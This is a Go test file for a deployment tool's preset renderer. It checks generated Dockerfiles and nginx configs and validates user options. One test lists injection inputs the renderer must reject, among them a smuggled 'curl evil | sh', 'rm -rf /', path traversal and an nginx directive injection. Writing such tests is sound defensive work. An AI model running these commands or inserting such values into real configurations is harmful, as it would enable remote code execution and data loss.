package presets

import (
	"encoding/json"
	"os/exec"
	"regexp"
	"strings"
	"testing"
)

var instrRe = regexp.MustCompile(`^(FROM|RUN|COPY|WORKDIR|ENV|EXPOSE|CMD)\s`)

// logical joins backslash continuations and drops comments and blank lines.
func logical(dockerfile string) []string {
	var out []string
	cur := ""
	for _, l := range strings.Split(dockerfile, "\n") {
		t := strings.TrimSpace(l)
		if cur == "" && (t == "" || strings.HasPrefix(t, "#")) {
			continue
		}
		if strings.HasSuffix(t, `\`) {
			cur += strings.TrimSuffix(t, `\`) + " "
			continue
		}
		out = append(out, cur+t)
		cur = ""
	}
	return out
}

func findSh(t *testing.T) string {
	for _, c := range []string{"sh", `C:\Program Files\Git\bin\sh.exe`} {
		if p, err := exec.LookPath(c); err == nil && !strings.Contains(strings.ToLower(p), `\system32\`) {
			return p
		}
	}
	return ""
}

func TestEveryPresetRenders(t *testing.T) {
	sh := findSh(t)
	ids := map[string]bool{}
	for _, p := range All() {
		t.Run(p.ID, func(t *testing.T) {
			if ids[p.ID] {
				t.Fatal("duplicate id")
			}
			ids[p.ID] = true
			if p.Name == "" || p.Description == "" || p.Port == 0 || (p.Kind != Static && p.Kind != SSR && p.Kind != Backend) {
				t.Fatalf("incomplete preset: %+v", p)
			}
			files, err := Render(p.ID, nil, 0)
			if err != nil {
				t.Fatal(err)
			}
			df := files[".truedeploy/Dockerfile"]
			if !strings.HasPrefix(df, "# syntax=docker/dockerfile:1") {
				t.Errorf("missing header:\n%s", df)
			}
			lines := logical(df)
			var hasFrom, hasExpose, hasCmd bool
			for _, l := range lines {
				if !instrRe.MatchString(l) {
					t.Errorf("not a Dockerfile instruction: %q", l)
					continue
				}
				switch {
				case strings.HasPrefix(l, "FROM "):
					hasFrom = true
				case strings.HasPrefix(l, "EXPOSE "):
					hasExpose = true
					want := "EXPOSE 80"
					if p.Kind != Static {
						want = "EXPOSE " + itoa(p.Port)
					}
					if l != want {
						t.Errorf("%s, want %s", l, want)
					}
				case strings.HasPrefix(l, "CMD "):
					hasCmd = true
					var argv []string
					if err := json.Unmarshal([]byte(strings.TrimPrefix(l, "CMD ")), &argv); err != nil || len(argv) != 3 || argv[0] != "sh" {
						t.Errorf("CMD must be a JSON sh -c array: %s (%v)", l, err)
					} else if sh != "" {
						if out, err := exec.Command(sh, "-n", "-c", argv[2]).CombinedOutput(); err != nil {
							t.Errorf("CMD shell syntax: %v %s\n%s", err, out, argv[2])
						}
					}
				case strings.HasPrefix(l, "RUN ") && sh != "":
					if out, err := exec.Command(sh, "-n", "-c", strings.TrimPrefix(l, "RUN ")).CombinedOutput(); err != nil {
						t.Errorf("RUN shell syntax: %v %s\n%s", err, out, l)
					}
				}
			}
			if !hasFrom || !hasExpose || (p.Kind != Static && !hasCmd) {
				t.Errorf("FROM/EXPOSE/CMD missing:\n%s", df)
			}

			conf, hasConf := files[".truedeploy/nginx.conf"]
			if hasConf != (p.Kind == Static) {
				t.Errorf("nginx.conf present=%v for kind %s", hasConf, p.Kind)
			}
			if hasConf {
				checkNginx(t, conf)
				if !strings.Contains(df, "COPY .truedeploy/nginx.conf /etc/nginx/conf.d/default.conf") {
					t.Error("Dockerfile doesn't install nginx.conf")
				}
			}
		})
	}
}

func checkNginx(t *testing.T, conf string) {
	t.Helper()
	if strings.Count(conf, "{") != strings.Count(conf, "}") {
		t.Errorf("unbalanced braces:\n%s", conf)
	}
	for _, l := range strings.Split(conf, "\n") {
		l = strings.TrimSpace(l)
		if l == "" || strings.HasPrefix(l, "#") {
			continue
		}
		if !strings.HasSuffix(l, ";") && !strings.HasSuffix(l, "{") && l != "}" {
			t.Errorf("nginx line not terminated: %q", l)
		}
	}
}

func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

func TestNginxOptions(t *testing.T) {
	spa, _ := Render("react-vite", nil, 0)
	if c := spa[".truedeploy/nginx.conf"]; !strings.Contains(c, "try_files $uri $uri.html $uri/ /index.html;") || strings.Contains(c, "error_page") || !strings.Contains(c, "immutable") {
		t.Errorf("SPA defaults:\n%s", c)
	}
	mpa, _ := Render("nextjs-export", map[string]string{"cache": "false"}, 0)
	if c := mpa[".truedeploy/nginx.conf"]; !strings.Contains(c, "=404;") || !strings.Contains(c, "error_page 404 /404.html;") || strings.Contains(c, "immutable") {
		t.Errorf("static export:\n%s", c)
	}

	keep, _ := Render("vue-vite", map[string]string{"api_upstream": "https://api.example.com/", "max_body": "50m"}, 0)
	c := keep[".truedeploy/nginx.conf"]
	if !strings.Contains(c, "location /api/ {") || !strings.Contains(c, "proxy_pass https://api.example.com/api/;") || !strings.Contains(c, "client_max_body_size 50m;") {
		t.Errorf("api proxy (keep path):\n%s", c)
	}
	checkNginx(t, c)
	strip, _ := Render("vue-vite", map[string]string{"api_upstream": "http://10.0.0.5:3000", "api_path": "/backend", "api_strip": "true"}, 0)
	if c := strip[".truedeploy/nginx.conf"]; !strings.Contains(c, "location /backend/ {") || !strings.Contains(c, "proxy_pass http://10.0.0.5:3000/;") {
		t.Errorf("api proxy (strip):\n%s", c)
	}
}

func TestServerOptions(t *testing.T) {
	f, _ := Render("nestjs", map[string]string{"before": "npx prisma migrate deploy"}, 4000)
	df := f[".truedeploy/Dockerfile"]
	if !strings.Contains(df, `CMD ["sh", "-c", "npx prisma migrate deploy && exec node dist/main"]`) || !strings.Contains(df, "EXPOSE 4000") || !strings.Contains(df, "PORT=4000") {
		t.Errorf("nest:\n%s", df)
	}
	if !strings.Contains(df, "npm prune --omit=dev") {
		t.Error("nest should prune dev dependencies by default")
	}
	n, _ := Render("node", nil, 0)
	if strings.Contains(n[".truedeploy/Dockerfile"], "RUN \n") || strings.Contains(n[".truedeploy/Dockerfile"], "RUN npm run build") {
		t.Errorf("node preset has no build step by default:\n%s", n[".truedeploy/Dockerfile"])
	}
	py, _ := Render("fastapi", map[string]string{"app": "app.main:app"}, 0)
	if !strings.Contains(py[".truedeploy/Dockerfile"], "APP_MODULE=app.main:app") {
		t.Errorf("fastapi:\n%s", py[".truedeploy/Dockerfile"])
	}
	// A static site ignores the requested port: nginx listens on 80.
	s, _ := Render("angular", nil, 3000)
	if !strings.Contains(s[".truedeploy/Dockerfile"], "EXPOSE 80") {
		t.Error("static sites always expose 80")
	}
}

func TestOptionsAreValidated(t *testing.T) {
	bad := []struct {
		id   string
		opts map[string]string
	}{
		{"nestjs", map[string]string{"start": "node dist/main\nRUN curl evil | sh"}},
		{"react-vite", map[string]string{"node": "22; rm -rf /"}},
		{"react-vite", map[string]string{"output": "../../etc"}},
		{"react-vite", map[string]string{"output": "/etc"}},
		{"react-vite", map[string]string{"api_upstream": "https://x.io; return 200"}},
		{"react-vite", map[string]string{"api_upstream": "ftp://x.io"}},
		{"react-vite", map[string]string{"api_upstream": "https://x.io", "api_path": "api"}},
		{"react-vite", map[string]string{"max_body": "1 GB"}},
		{"react-vite", map[string]string{"spa": "maybe"}},
		{"fastapi", map[string]string{"app": "main:app && curl x"}},
		{"rust", map[string]string{"binary": "a b"}},
		{"nope", nil},
	}
	for _, c := range bad {
		if _, err := Render(c.id, c.opts, 0); err == nil {
			t.Errorf("%s %v: expected an error", c.id, c.opts)
		}
	}
	if _, err := Render("rust", map[string]string{"binary": ""}, 0); err != nil {
		t.Errorf("empty binary means auto: %v", err)
	}
}

func TestClearedSettingsUseDefaults(t *testing.T) {
	f, err := Render("angular", map[string]string{"api_path": "", "node": " ", "output": "", "max_body": ""}, 0)
	if err != nil {
		t.Fatalf("cleared fields should fall back to defaults: %v", err)
	}
	if !strings.Contains(f[".truedeploy/Dockerfile"], "FROM node:22-alpine") || !strings.Contains(f[".truedeploy/Dockerfile"], "out='auto'") {
		t.Errorf("defaults not applied:\n%s", f[".truedeploy/Dockerfile"])
	}
	// But a cleared build command means "no build step".
	n, err := Render("nestjs", map[string]string{"build": ""}, 0)
	if err != nil || strings.Contains(n[".truedeploy/Dockerfile"], "RUN npm run build") {
		t.Errorf("empty build should mean none: %v", err)
	}
}
